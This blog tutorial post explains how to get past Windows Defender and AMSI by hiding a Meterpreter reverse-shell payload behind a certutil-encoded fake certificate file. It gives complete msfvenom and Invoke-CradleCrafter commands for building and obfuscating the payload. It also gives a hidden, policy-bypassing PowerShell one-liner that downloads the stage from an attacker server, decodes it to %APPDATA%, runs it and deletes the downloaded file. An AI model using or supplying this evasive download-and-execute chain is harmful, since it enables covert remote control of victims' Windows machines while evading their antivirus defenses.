---
layout: post
title: "PowerShell: In-Memory Injection Using CertUtil.exe"
date: "2022-05-18"
description: "Using PowerShell, `Invoke-CradleCrafter` and Microsoft’s Certutil.exe to craft a payload and one-liner that can be used to evade the latest version of Windows Defender (as of this writing)."
coverimage: PowerShell_In_Memory_Injection_Using_CertUtil_exe.jpg
tags: certutil powershell
published: true
posttype: article
categories: tutorial
---
- PowerShell is still one of the easiest and best ways to gain a foothold, but at the same time, it is selling you out because it talks to AMSI as soon as it’s run.
- The beauty of this method is that Microsoft’s `certutil` does the network call out to your primary payload while appearing to be an innocent certificate file.

**Pre-Requisites**

- Download `Invoke-CradleCrafter` from GitHub.

**Methodology**

1. First, we will create a base64 encoded PowerShell Meterpreter payload by performing the following:

```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<YOUR IP HERE> LPORT=443 -e cmd/powershell_base64 -f psh -o b64_pwsh.txt
```

<div class="card-body es-lightbulb"><p>
**Note** that the payload file’s extension could be anything as long as `certutil` can get at it and read its content. For example, an organization may have a policy (or IDS, content filter, etc.) that does not allow the downloading of scripts; however, they probably allow .txt files or even files with abnormal extensions. If you change it, make sure you compensate for that when setting the URL in `Invoke-CradleCrafter`</p>
</div>


1. Next, you will create a folder used to serve up web content. Place the PowerShell Meterpreter PowerShell script (`b64_pwsh.txt`) inside this folder.
2. Next, we will use `Invoke-CradleCrafter` to obfuscate our `certutil` and PowerShell commands used to perform the in-memory injection. Drop into a PowerShell prompt on your Linux host by typing `pwsh` or `powershell`.  Then `cd` into your `Invoke-CradleCrafter` directory.

```powershell
Import-Module .\Invoke-CradleCrafter.psd1; 
Invoke-CradleCrafter
Invoke-CradleCrafter> SET URL http://10.10.10.10/b64_pwsh.txt
Invoke-CradleCrafter> MEMORY
Invoke-CradleCrafter> CERTUTIL
```

1. Next, you will be presented with your obfuscation options. Select **ALL** by typing it on the command line and then typing **1** to execute.

```
:::powershell
Invoke-CradleCrafter> ALL
Invoke-CradleCrafter> 1
```

1. Once generated, we now have a PowerShell cradle with obfuscation that can pull in our `b64_pwsh.txt` payload. We now want to put this into a text file such as `output.txt` for encoding. 
2. We will encode this file in base64 using the `certutil` to create a file called `cert.cer` which will end up on our web server next to the `b64_pwsh.txt`.

```
certutil -encode output.txt cert.cet
```

1. We can now use the following one-liner to pull our `cert.cer` certificate from our web server; the certificate gets decoded and saved to the disk as `stager.ps1`. The file `stager.ps1` is then executed (this is the content of the cradle we made earlier with `Invoke-CradleCrafter`), and when it runs, it pulls the `b64_pwsh.txt` file down from the server and executes it to give us a Metasploit Meterpreter session.  

```
:::powershell
powershell.exe -Win hiddeN -Exec ByPasS add-content -path %APPDATA%\cert.cer (New-Object Net.WebClient).DownloadString('http://10.10.10.10/cert.cer'); certutil -decode %APPDATA%\cert.cer %APPDATA%\stager.ps1 & start /b cmd /c powershell.exe -Exec Bypass -NoExit -File %APPDATA%\stager.ps1 & start /b cmd /c del %APPDATA%\cert.cer
```

<div class="card-body es-warning"><p> **NOTE** that the `cert.cer` file will be deleted by the script; however, you will need to remove the `stager.ps1` file manually.</p>
</div>